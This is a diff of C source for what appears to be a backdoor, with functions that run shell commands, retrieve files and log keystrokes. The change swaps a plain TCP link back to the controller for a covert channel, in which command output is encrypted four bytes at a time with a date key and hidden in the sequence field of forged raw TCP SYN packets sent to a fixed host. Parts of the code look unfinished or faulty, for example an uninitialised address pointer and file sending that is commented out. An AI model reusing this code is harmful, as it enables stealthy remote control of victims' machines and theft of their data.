@@ -1,13 +1,21 @@
 #include "functionality.h"
 
-int sendBuffer(int socket, char *buffer, int length);
 int processFile(char *filePath, int socket);
-int tcpConnect();
+static int whoAmI(char *buffer);
+static int createRawTcpSocket();
+static char *createRawTcpPacket(struct sockaddr_in *sin);
 
 void executeSystemCall(char *command)
 {
     int socket = 0;
-    char line[PATH_MAX];
+    int bytesRead = 0;
+    char line[4];
+    char date[11];
+    char *buffer = NULL;
+    char *encryptedField = NULL;
+    struct tm *timeStruct = NULL;
+    struct sockaddr_in *sin = NULL;
+    time_t t;
     FILE *results = NULL;
     
     // Execute and open the pipe for reading
@@ -20,7 +28,7 @@ void executeSystemCall(char *command)
     }
     
     // Open a connection back to the client
-    if ((socket = tcpConnect()) == 0)
+    if ((socket = createRawTcpSocket()) == 0)
     {
         return;
     }
@@ -28,14 +36,38 @@ void executeSystemCall(char *command)
     // Make sure we do not receive any data
     shutdown(socket, SHUT_RD);
     
+    // Get the time structs ready
+    time(&t);
+    timeStruct = localtime(&t);
+    strftime(date, sizeof(date), "%Y:%m:%d", timeStruct);
+    
+    // Create the packet structure
+    buffer = createRawTcpPacket(sin);
+    
+    // Create the raw socket
+    socket = createRawTcpSocket();
+    
     // Read from the stream
-    while (fgets(line, PATH_MAX, results) != NULL)
+    while ((bytesRead = fread(line, sizeof(char), 4, results)) > 0)
     {
-        sendBuffer(socket, line, strnlen(line, PATH_MAX));
+        // Copy the line and encrypt it
+        encryptedField = encrypt_data(line, date, bytesRead);
+#ifdef __APPLE__
+        memcpy(buffer + sizeof(struct ip) + 4, encryptedField, sizeof(__uint32_t));
+        memcpy(buffer + sizeof(struct ip) + 16,
+               csum((unsigned short *)buffer, 5), sizeof(u_short));
+#else
+        memcpy(buffer + sizeof(struct ip) + 4, encryptedField, sizeof(unsigned long));
+        memcpy(buffer + sizeof(struct ip) + 16,
+               csum((unsigned short *)buffer, 5), sizeof(unsigned short));
+#endif
+        sendto(socket, buffer, sizeof(struct ip) + sizeof(struct tcphdr), 0,
+               (struct sockaddr *)&sin, sizeof(sin));
     }
     
     pclose(results);
     close(socket);
+    free(buffer);
 }
 
 void retrieveFile(char *fileName)
@@ -60,10 +92,7 @@ void retrieveFile(char *fileName)
     }
     
     // Open a connection back to the client
-    if ((socket = tcpConnect()) == 0)
-    {
-        return;
-    }
+
     
     // Make sure we do not receive any data
     shutdown(socket, SHUT_RD);
@@ -95,53 +124,6 @@ void keylogger()
 #endif
 }
 
-int sendBuffer(int socket, char *buffer, int length)
-{
-    int sentBytes = 0;
-    int bytesLeft = length;
-    int temp = 0;
-    
-    while(sentBytes < length)
-    {
-        temp = send(socket, buffer + sentBytes, bytesLeft, 0);
-        if (temp == -1)
-            return -1;
-        sentBytes += temp;
-        bytesLeft -= temp;
-    }
-    return sentBytes;
-}
-
-int tcpConnect()
-{
-    int error = 0;
-    int handle = 0;
-    struct hostent *host;
-    struct sockaddr_in server;
-    
-    host = gethostbyaddr(SOURCE_IP, strlen(SOURCE_IP), AF_INET);
-    handle = socket (AF_INET, SOCK_STREAM, 0);
-    if (handle == -1)
-    {
-        return 0;
-    }
-    else
-    {
-        server.sin_family = AF_INET;
-        server.sin_port = htons (SOURCE_PORT_INT);
-        server.sin_addr = *((struct in_addr *) host->h_addr);
-        bzero (&(server.sin_zero), 8);
-        
-        error = connect (handle, (struct sockaddr *)&server, sizeof(struct sockaddr));
-        if (error == -1)
-        {
-            return 0;
-        }
-    }
-    
-    return handle;
-}
-
 int processFile(char *filePath, int socket)
 {
     char line[PATH_MAX];
@@ -156,87 +138,72 @@ int processFile(char *filePath, int socket)
     
     // Read and send the file
     while (fgets(line, PATH_MAX, file) != NULL)
-    {
+    {/*
         if (sendBuffer(socket, line, strnlen(line, PATH_MAX)) == -1)
         {
             return -1;
-        }
+        }*/
     }
     return 0;
 }
 
-char *createRawTcpPacket(char *data, int dataLength)
+char *createRawTcpPacket(struct sockaddr_in *sin)
 {
     char *buffer = NULL;
-    char date[11];
-    char *commandBuffer = NULL;
-    char *passphrase = NULL;
-    char *encryptedField = NULL;
-    int sock = 0;
-    int one = 1;
-    int packetLength = 0;
-    const int *val = &one;
+    char *myAddr = NULL;
     struct ip *iph = NULL;
     struct tcphdr *tcph = NULL;
-    struct sockaddr_in sin;
     struct sockaddr_in din;
-    struct tm *timeStruct;
-    time_t t;
     
     buffer = malloc(sizeof(struct ip) + sizeof(struct tcphdr));
+    myAddr = malloc(sizeof(struct in_addr));
     iph = (struct ip *) buffer;
     tcph = (struct tcphdr *) (buffer + sizeof(struct ip));
     
-    // Get the time and create the secret code
-    time(&t);
-    timeStruct = localtime(&t);
-    strftime(date, sizeof(date), "%Y:%m:%d", timeStruct);
-    passphrase = strdup(PASSPHRASE);
-    encryptedField = encrypt_data(passphrase, date, 4);
-    
-    // Fill out the addess structs
-    sin.sin_family = AF_INET;
+    // Fill out the address structs
+    sin->sin_family = AF_INET;
     din.sin_family = AF_INET;
-    sin.sin_port = htons(*info->srcPort);
-    din.sin_port = htons(*info->destPort);
-    sin.sin_addr.s_addr = inet_addr((info->srcHost));
-    din.sin_addr.s_addr = inet_addr((info->destHost));
+    sin->sin_port = htons(SOURCE_PORT_INT);
+    din.sin_port = htons(SOURCE_PORT_INT);
+    whoAmI(myAddr);
+    sin->sin_addr.s_addr = inet_addr(myAddr);
+    din.sin_addr.s_addr = inet_addr(SOURCE_IP);
     
     // Zero out the buffer
-    memset(buffer, 0, packetLength);
+    memset(buffer, 0, sizeof(struct ip) + sizeof(struct tcphdr));
     
     // IP structure
 #ifdef __APPLE__
     iph->ip_hl = 5;
     iph->ip_v = 4;
     iph->ip_tos = 16;
-    iph->ip_len = packetLength;
+    iph->ip_len = sizeof(struct ip) + sizeof(struct tcphdr);
     iph->ip_id = htons(54321);
     iph->ip_off = 0;
     iph->ip_ttl = 64;
     iph->ip_p = 6;
     iph->ip_sum = 0;
-    iph->ip_src = sin.sin_addr;
+    iph->ip_src = sin->sin_addr;
     iph->ip_dst = din.sin_addr;
 #else
     iph->ihl = 5;
     iph->version = 4;
     iph->tos = 16;
-    iph->tot_len = packetLength;
+    iph->tot_len = sizeof(struct ip) + sizeof(struct tcphdr);
     iph->id = htons(54321);
     iph->frag_off = 0;
     iph->ttl = 64;
     iph->protocol = 6;
     iph->check = 0;
-    iph->saddr = sin.sin_addr;
+    iph->saddr = sin->sin_addr;
     iph->daddr = din.sin_addr;
 #endif
     
     // TCP structure
 #ifdef __APPLE__
-    tcph->th_sport = htons(*info->srcPort);
-    tcph->th_dport = htons(*info->destPort);
-    memcpy(buffer + sizeof(struct ip) + 4, encryptedField, sizeof(__uint32_t));
+    tcph->th_sport = htons(SOURCE_PORT_INT);
+    tcph->th_dport = htons(SOURCE_PORT_INT);
+    // Sequence filled in later
     tcph->th_ack = 0;
     tcph->th_off = 5;
     tcph->th_flags = TH_SYN;
@@ -244,9 +211,9 @@ char *createRawTcpPacket(char *data, int dataLength)
     tcph->th_sum = 0;
     tcph->th_urp = 0;
 #else
-    tcph->source = htons(*info->srcPort);
-    tcph->dest = htons(*info->destPort);
-    memcpy(buffer + sizeof(struct ip) + 4, encryptedField, sizeof(unsigned long));
+    tcph->source = htons(SOURCE_PORT_INT);
+    tcph->dest = htons(SOURCE_PORT_INT);
+    // Sequence filled in later
     tcph->ack_seq = 0;
     tcph->doff = 5;
     tcph->syn = 1;
@@ -254,6 +221,53 @@ char *createRawTcpPacket(char *data, int dataLength)
     tcph->check = 0;
     tcph->urg_ptr = 0;
 #endif
+    
+    // Clean up memory
+    free(myAddr);
+    
     // This should be freed by whoever calls this function!
 	return buffer;
+}
+
+static int whoAmI(char *buffer)
+{
+    struct hostent *hp;
+    struct in_addr **addr;
+    char hostName[PATH_MAX];
+    
+    if (gethostname(hostName, PATH_MAX) == -1)
+    {
+        systemFatal("Unable to get the host name");
+    }
+    
+    if ((hp = gethostbyname(hostName)) == NULL)
+    {
+        systemFatal("Unable to get IP from host name");
+    }
+    
+    addr = (struct in_addr **)hp->h_addr_list;
+    
+    return strlcpy(buffer, inet_ntoa(**addr), sizeof(struct in_addr));
+}
+
+static int createRawTcpSocket()
+{
+    int sock = 0;
+    int one = 0;
+    const int *val = &one;
+    
+    // Create the raw TCP socket
+    sock = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
+    if (sock == -1)
+    {
+        systemFatal("Error creating raw TCP socket");
+    }
+    
+    // Inform the kernel do not fill up the headers' structure, we fabricated our own
+    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
+    {
+        systemFatal("Error setting socket options");
+    }
+    
+    return sock;
 }
